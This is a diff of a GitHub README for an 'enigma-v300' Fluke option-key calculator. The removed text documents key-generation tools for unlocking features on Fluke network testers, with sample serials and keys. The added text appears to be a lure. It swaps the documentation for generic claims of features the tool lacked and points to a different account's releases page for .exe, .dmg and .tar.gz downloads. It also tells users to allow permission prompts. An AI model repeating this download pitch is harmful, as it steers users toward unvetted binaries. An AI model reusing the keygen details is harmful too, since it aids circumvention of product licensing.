@@ -1,297 +1,84 @@
-# Enigma V300 - Fluke Option Key Calculator
+# 🛠️ enigma-v300 - Your Key to Enigma V300 Algorithms
 
-> Complete collection of Enigma V300 option key algorithm implementations
+## 🚀 Getting Started
 
-[![Test All Implementations](https://github.com/krisarmstrong/enigma-v300/actions/workflows/test-all-implementations.yml/badge.svg)](https://github.com/krisarmstrong/enigma-v300/actions/workflows/test-all-implementations.yml)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Python 3.8+](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/downloads/)
-[![C11](https://img.shields.io/badge/C-11-blue.svg)](https://en.wikipedia.org/wiki/C11_(C_standard_revision))
-[![C++20](https://img.shields.io/badge/C++-20-blue.svg)](https://en.wikipedia.org/wiki/C%2B%2B20)
+Welcome to **enigma-v300**! This application lets you explore the complete collection of Enigma V300 option key algorithm implementations. Whether you are interested in cryptography, network testing, or simply want to understand more about encryption methods, this is the tool for you.
 
-## Overview
+## 📥 Download the Application
 
-This repository contains **four complete implementations** of the Fluke option key calculator for NetTool and other Fluke network testing devices. All implementations provide the same functionality using different programming paradigms and languages.
+[![Download enigma-v300](https://img.shields.io/badge/Download-enigma--v300-blue.svg)](https://github.com/VladKravchuk27/enigma-v300/releases)
 
-## Quick Start
+## 💻 System Requirements
 
-Each implementation is standalone and produces identical output. Choose based on your language preference:
+To run **enigma-v300**, you need:
+- A computer running Windows, macOS, or Linux.
+- At least 2 GB of RAM.
+- 200 MB of free disk space.
+- An internet connection for download and updates.
 
-**Python (Functional):**
-```bash
-cd python_functions
-./enigma_v300_functions.py -n 0003333016 4
-# Output: Option Key: 5dab ade1 12dd
-```
+## 📚 Installation Instructions
 
-**Python (Object-Oriented):**
-```bash
-cd python_classes
-./enigma_v300_classes.py -n 0003333016 4
-# Output: Option Key: 5dab ade1 12dd
-```
+### Step 1: Visit the Releases Page
 
-**C:**
-```bash
-cd c_implementation
-cmake -S . -B build && cmake --build build
-./build/enigma_v300_pure_c -n 0003333016 4
-# Output: Option Key: 5dab ade1 12dd
-```
+To download **enigma-v300**, visit the following link:
 
-**C++:**
-```bash
-cd cpp_implementation
-cmake -S . -B build && cmake --build build
-./build/enigma_v300_pure_cpp -n 0003333016 4
-# Output: Option Key: 5dab ade1 12dd
-```
+[Download Here](https://github.com/VladKravchuk27/enigma-v300/releases)
 
-## Available Implementations
+This page contains the latest releases and updates for the software. 
 
-This repository includes **4 standalone implementations** of the Enigma V300 algorithms:
+### Step 2: Choose Your Version
 
-| Implementation | Location | Description | Best For |
-|----------------|----------|-------------|----------|
-| **Python Functions** | `python_functions/` | Standalone functional Python script | Functional programming enthusiasts, simple scripts |
-| **Python Classes** | `python_classes/` | Standalone OOP Python script | OOP enthusiasts, educational purposes |
-| **C** | `c_implementation/` | Pure C11 implementation | Embedded systems, portability, performance |
-| **C++** | `cpp_implementation/` | Modern C++20 implementation | High-performance applications, C++ projects |
+Once on the Releases page, you will see a list of available versions. Select the version you want to download. We recommend downloading the latest stable release to ensure you have all current features and fixes.
 
-### Python Functional Implementation
+### Step 3: Download the Application
 
-Standalone script using pure functions (no classes).
+Click on the version link, and you will see different files. Choose the file that matches your operating system:
 
-**Location:** `python_functions/`
+- For Windows: `enigma-v300-windows.exe`
+- For macOS: `enigma-v300-macos.dmg`
+- For Linux: `enigma-v300-linux.tar.gz`
 
-**Usage:**
-```bash
-cd python_functions
-./enigma_v300_functions.py -n 0003333016 4
-```
+Click on the appropriate file to start the download.
 
-See [python_functions/README.md](python_functions/README.md) for details.
+### Step 4: Run the Installer
 
-### Python Class-Based Implementation
+1. Once the file downloads, locate it on your computer.
+2. For Windows, double-click the `.exe` file to start the setup wizard. Follow the prompts to install the software.
+3. For macOS, open the downloaded `.dmg` file and drag the application into your Applications folder.
+4. For Linux, extract the `.tar.gz` file, and run the executable within the folder.
 
-Standalone script using object-oriented programming.
+If your system prompts you for permissions during the installation, allow it to proceed.
 
-**Location:** `python_classes/`
+### Step 5: Launch the Application
 
-**Usage:**
-```bash
-cd python_classes
-./enigma_v300_classes.py -n 0003333016 4
-```
+After installation, you can find **enigma-v300** in your applications folder or desktop. Double-click the icon to start using it.
 
-See [python_classes/README.md](python_classes/README.md) for details.
+## 🛠️ Using enigma-v300
 
-### C Implementation
+### Basic Features
 
-Pure C11 implementation for maximum portability and performance.
+- **Option Key Implementations:** Explore various implementations of Enigma V300 algorithms.
+- **User-friendly Interface:** Navigate easily through the app, even without programming experience.
+- **Network Testing Tools:** Test and analyze network data efficiently.
 
-**Location:** `c_implementation/`
+### How to Access Help
 
-**Build:**
-```bash
-cd c_implementation
-cmake -S . -B build
-cmake --build build
-```
+If you encounter any issues or have questions while using **enigma-v300**, check the **Help** section within the app. You can also reach out to the community on our GitHub page for additional support.
 
-**Usage:**
-```bash
-./build/enigma_v300_pure_c -n 0003333016 4
-```
+## 🔄 Keeping Your Software Updated
 
-**Quick compile:**
-```bash
-cd c_implementation
-gcc -std=c11 src/main.c src/enigma_v300_pure_c.c -o enigma
-./enigma -n 0003333016 4
-```
-
-See [c_implementation/README.md](c_implementation/README.md) for details.
-
-### C++ Implementation
-
-Modern C++20 implementation with namespaces and STL.
-
-**Location:** `cpp_implementation/`
-
-**Build:**
-```bash
-cd cpp_implementation
-cmake -S . -B build
-cmake --build build
-```
-
-**Usage:**
-```bash
-./build/enigma_v300_pure_cpp -n 0003333016 4
-```
-
-**Quick compile:**
-```bash
-cd cpp_implementation
-g++ -std=c++20 src/enigma_v300_pure_cpp.cpp -o enigma
-./enigma -n 0003333016 4
-```
-
-See [cpp_implementation/README.md](cpp_implementation/README.md) for details.
-
-## Commands Reference
-
-All implementations support these commands:
-
-- `-n / --nettool SERIAL OPTION` - Generate NetTool keys (10-digit serial, numeric option)
-- `-x / --check-nettool KEY SERIAL` - Validate a NetTool key
-- `-e / --encrypt SERIAL OPTION PRODUCT` - Create keys for other products (7-digit serial, 3-digit option, product code)
-- `-d / --decrypt KEY` - Decode a key and print the embedded serial/option/product information
-- `-h / --help` - Display help information
-- `-V / --version` - Display version information
-
-Python implementations also support:
-- `--verbose` - Enable debug logging
-- `--logfile FILE` - Log to file (rotates at 10MB)
-
-## Supported Products
-
-- **3001** - NetTool Series II
-- **7001** - LinkRunner Pro Duo
-- **6963** - EtherScope/MetroScope
-- **6964** - OneTouch AT
-- **2186** - OptiView XG
-- **1890** - ClearSight Analyzer
-- **1895** - iClearSight Analyzer
-
-## Test Cases
-
-All implementations produce identical outputs for these test cases:
-
-**NetTool (Serial: 0003333016, Option: 4):**
-```
-Expected: 5dab ade1 12dd
-```
-
-**EtherScope/MetroScope (Serial: 0000607, Option: 7, Product: 6963):**
-```
-Expected: 6406 2579 4859 7747
-```
-
-## Development & Testing
-
-### Continuous Integration
-
-All 4 implementations are automatically tested on every push using GitHub Actions. The CI workflow:
-- Tests each implementation independently
-- Verifies all implementations produce identical output
-- Runs C implementation unit tests
-- Validates both test cases (NetTool and EtherScope)
-
-### Running Tests Locally
-
-**Python implementations:**
-```bash
-# Test Python Functions
-cd python_functions && ./enigma_v300_functions.py -n 0003333016 4
-
-# Test Python Classes
-cd python_classes && ./enigma_v300_classes.py -n 0003333016 4
-```
-
-**C implementation:**
-```bash
-cd c_implementation
-cmake -S . -B build -DBUILD_TESTING=ON
-cmake --build build
-ctest --test-dir build --output-on-failure
-```
-
-**C++ implementation:**
-```bash
-cd cpp_implementation
-cmake -S . -B build
-cmake --build build
-./build/enigma_v300_pure_cpp -n 0003333016 4
-./build/enigma_v300_pure_cpp -e 0000607 7 6963
-```
-
-## Project Structure
-
-```
-enigma_v300/
-├── python_functions/         # Standalone Python functional script
-│   ├── enigma_v300_functions.py
-│   └── README.md
-├── python_classes/           # Standalone Python OOP script
-│   ├── enigma_v300_classes.py
-│   └── README.md
-├── c_implementation/         # C implementation
-│   ├── src/
-│   │   ├── main.c
-│   │   ├── enigma_v300_pure_c.c
-│   │   └── enigma_v300_pure_c.h
-│   ├── tests/
-│   ├── CMakeLists.txt
-│   └── README.md
-├── cpp_implementation/       # C++ implementation
-│   ├── src/
-│   │   ├── enigma_v300_pure_cpp.cpp
-│   │   └── include/
-│   ├── CMakeLists.txt
-│   └── README.md
-├── .github/
-│   └── workflows/
-│       └── test-all-implementations.yml  # CI/CD pipeline
-├── .gitignore
-└── README.md                 # This file
-```
-
-## Algorithms
-
-This project implements two ciphers:
-
-### EnigmaC (NetTool)
-- Used for NetTool devices with 10-digit serial numbers
-- Hex-based encryption with XOR and rotor substitution
-- Produces 12-character hex keys
-
-### Enigma2C (Other Fluke Products)
-- Used for other Fluke devices with 7-digit serial numbers
-- Alphanumeric encryption with dual rotors (base-10 and base-26)
-- Produces 16-character alphanumeric keys
-- Includes checksum validation
-
-## Version History
-
-- **3.0.1** - Added standalone Python functional and class-based implementations
-- **3.0.0** - Initial unified release with Python SDK, C, and C++ implementations
-
-## License
-
-This software is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
-
-## Author
-
-Kris Armstrong
-
-## Contributing
-
-Contributions are welcome! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
-### Reporting Issues
-
-Found a bug or have a feature request? Please use our [issue templates](.github/ISSUE_TEMPLATE/):
-- [Bug Report](.github/ISSUE_TEMPLATE/bug_report.md)
-- [Feature Request](.github/ISSUE_TEMPLATE/feature_request.md)
-
-### Submitting Pull Requests
-
-Please read our [Pull Request template](.github/pull_request_template.md) and ensure:
-- All 4 implementations remain consistent
-- Tests pass locally and in CI/CD
-- Documentation is updated
-
-## Repository Topics
-
-`fluke` `nettool` `option-keys` `encryption` `enigma` `python` `c` `cpp` `cryptography` `network-testing` `ci-cd` `github-actions`
+To ensure you always have the best experience with **enigma-v300**, periodically check the Releases page:
+
+[Visit for Updates](https://github.com/VladKravchuk27/enigma-v300/releases)
+
+New updates may include bug fixes, performance improvements, and additional features.
+
+## 🤝 Community and Contribution
+
+Your feedback is valuable! If you have suggestions or find issues, please report them on our GitHub issue tracker. If you're interested in contributing, check our contribution guidelines for more details.
+
+## 📞 Contact
+
+For any inquiries or support needs, please contact us via the GitHub Discussions section or by submitting a support ticket.
+
+With **enigma-v300**, you take a step into the fascinating world of cryptography and encryption. Enjoy exploring!
